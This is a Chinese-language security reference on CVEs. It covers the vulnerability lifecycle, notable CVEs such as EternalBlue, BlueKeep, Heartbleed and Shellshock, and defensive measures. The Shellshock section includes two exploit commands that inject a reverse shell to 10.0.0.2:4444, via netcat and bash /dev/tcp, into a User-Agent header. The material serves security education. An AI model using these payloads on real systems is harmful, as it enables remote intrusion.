# 通用漏洞与暴露 (CVE)

> CVE（通用漏洞与暴露）是分配给公开已知网络安全漏洞的唯一标识符。CVE 帮助标准化漏洞的命名和跟踪，使组织、安全专业人员和软件供应商更容易共享信息并管理与这些漏洞相关的风险。每个 CVE 条目都包含漏洞的简要描述、其潜在影响以及受影响软件或系统的详细信息。

## CVE 漏洞管理原理

CVE（Common Vulnerabilities and Exposures）系统是一个由 MITRE 公司维护的公开漏洞数据库，它为每个已知的网络安全漏洞分配一个唯一的标识符。了解 CVE 系统及其相关漏洞对于网络安全专业人员至关重要。

### 漏洞生命周期

1. **发现与报告**：
   - 安全研究人员或组织发现漏洞
   - 向供应商或 CERT 报告漏洞
   - 分配 CVE ID 进行跟踪

2. **评估与分类**：
   - 评估漏洞的严重性（CVSS 评分）
   - 确定受影响的系统和版本
   - 分类漏洞类型（如 RCE、XSS、SQLi 等）

3. **补丁开发**：
   - 供应商开发并测试安全补丁
   - 发布安全公告和补丁说明
   - 提供缓解措施（如适用）

4. **补丁部署**：
   - 组织评估和测试补丁
   - 制定部署计划
   - 在生产环境中部署补丁

### 漏洞利用趋势

- **远程代码执行 (RCE)**：允许攻击者在目标系统上执行任意代码
- **权限提升**：允许攻击者获得比预期更高的权限
- **信息泄露**：导致敏感信息暴露给未授权方
- **拒绝服务 (DoS)**：导致系统崩溃或变得不可用

### 漏洞管理最佳实践

- 定期扫描系统以识别已知漏洞
- 优先修复高风险漏洞
- 实施补丁管理流程
- 监控安全公告和威胁情报
- 维护最新的软件和依赖项

## 目录

- [工具](#工具)
- [过去15年的重大CVE漏洞](#过去15年的重大cve漏洞)
    - [CVE-2017-0144 - EternalBlue](#cve-2017-0144---eternalblue)
    - [CVE-2017-5638 - Apache Struts 2](#cve-2017-5638---apache-struts-2)
    - [CVE-2018-7600 - Drupalgeddon 2](#cve-2018-7600---drupalgeddon-2)
    - [CVE-2019-0708 - BlueKeep](#cve-2019-0708---bluekeep)
    - [CVE-2019-19781 - Citrix ADC Netscaler](#cve-2019-19781---citrix-adc-netscaler)
    - [CVE-2014-0160 - Heartbleed](#cve-2014-0160---heartbleed)
    - [CVE-2014-6271 - Shellshock](#cve-2014-6271---shellshock)
- [防御措施](#防御措施)
- [参考资料](#参考资料)

## 工具

* [Trickest CVE 仓库 - 自动收集的CVE和PoC](https://github.com/trickest/cve)
* [Nuclei 模板 - 社区策划的nuclei引擎模板，用于查找应用程序中的安全漏洞](https://github.com/projectdiscovery/nuclei-templates)
* [Metasploit 框架](https://github.com/rapid7/metasploit-framework)
* [CVE 详情 - 终极安全漏洞数据源](https://www.cvedetails.com)

## 过去15年的重大CVE漏洞

### CVE-2017-0144 - EternalBlue

EternalBlue 利用了微软服务器消息块(SMB)协议实现中的一个漏洞。该漏洞存在于多个版本的 Microsoft Windows 的 SMB 版本 1 (SMBv1) 服务器中，该服务器错误处理了来自远程攻击者的特制数据包，允许他们在目标计算机上执行任意代码。

受影响的系统：

* Windows Vista SP2
* Windows Server 2008 SP2 和 R2 SP1
* Windows 7 SP1
* Windows 8.1
* Windows Server 2012 Gold 和 R2
* Windows RT 8.1
* Windows 10 Gold、1511 和 1607
* Windows Server 2016

### CVE-2017-5638 - Apache Struts 2

2017年3月6日，Apache Struts 2 中一个新的远程代码执行(RCE)漏洞被公开。这个最近的漏洞 CVE-2017-5638 允许远程攻击者通过"Content-Type"头向Web应用程序注入操作系统命令。

### CVE-2018-7600 - Drupalgeddon 2

Drupal 7.x 和 8.x 的多个子系统中存在一个远程代码执行漏洞。这可能允许攻击者利用Drupal站点上的多个攻击向量，可能导致站点完全被攻陷。

### CVE-2019-0708 - BlueKeep

远程桌面服务（以前称为终端服务）中存在一个远程代码执行漏洞，当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时。此漏洞是预认证的，不需要用户交互。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新账户。

### CVE-2019-19781 - Citrix ADC Netscaler

Citrix Application Delivery Controller (ADC)（以前称为 NetScaler ADC）和 Citrix Gateway（以前称为 NetScaler Gateway）中存在一个远程代码执行漏洞，如果被利用，可能允许未经身份验证的攻击者执行任意代码。

受影响的产品：

* Citrix ADC 和 Citrix Gateway 13.0 所有受支持版本
* Citrix ADC 和 NetScaler Gateway 12.1 所有受支持版本
* Citrix ADC 和 NetScaler Gateway 12.0 所有受支持版本
* Citrix ADC 和 NetScaler Gateway 11.1 所有受支持版本
* Citrix NetScaler ADC 和 NetScaler Gateway 10.5 所有受支持版本

### CVE-2014-0160 - Heartbleed

Heartbleed 漏洞是流行的 OpenSSL 加密软件库中的一个严重漏洞。这个弱点允许窃取在正常情况下受 SSL/TLS 加密保护的信息，这些加密用于保护互联网安全。SSL/TLS 为 Web、电子邮件、即时消息(IM) 和一些虚拟专用网络(VPN) 等应用程序提供互联网通信安全和隐私。

### CVE-2014-6271 - Shellshock

Shellshock，也称为 Bashdoor，是广泛使用的 Unix Bash shell 中的一个安全漏洞家族，其中第一个漏洞于 2014 年 9 月 24 日披露。许多面向互联网的服务（如某些 Web 服务器部署）使用 Bash 处理某些请求，这允许攻击者使易受攻击的 Bash 版本执行任意命令。这可能允许攻击者未经授权访问计算机系统。

```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
```

## 防御措施

1. **漏洞管理**：
   - 建立和维护资产清单
   - 定期进行漏洞扫描和评估
   - 优先修复高风险漏洞
   - 实施补丁管理流程

2. **网络分段**：
   - 将关键系统与常规网络隔离
   - 实施适当的网络访问控制
   - 监控网络流量以检测异常活动

3. **安全配置**：
   - 禁用不必要的服务和功能
   - 实施最小权限原则
   - 定期审核系统配置

4. **安全意识培训**：
   - 教育员工识别社会工程攻击
   - 提供安全编码实践培训
   - 建立安全事件响应计划

5. **监控与响应**：
   - 实施入侵检测/防御系统
   - 定期审查日志和警报
   - 建立事件响应团队和流程

## 参考资料

* [Heartbleed - 官方网站](http://heartbleed.com)
* [Shellshock - 维基百科](https://zh.wikipedia.org/wiki/Shellshock)
* [Imperva Apache Struts 分析](https://www.imperva.com/blog/2017/03/cve-2017-5638-new-remote-code-execution-rce-vulnerability-in-apache-struts-2/)
* [EternalBlue - 维基百科](https://zh.wikipedia.org/wiki/EternalBlue)
* [BlueKeep - 微软](https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2019-0708)
* [CVE 官方网站](https://cve.mitre.org/)
* [国家漏洞数据库 (NVD)](https://nvd.nist.gov/)
* [OWASP 十大漏洞](https://owasp.org/www-project-top-ten/)
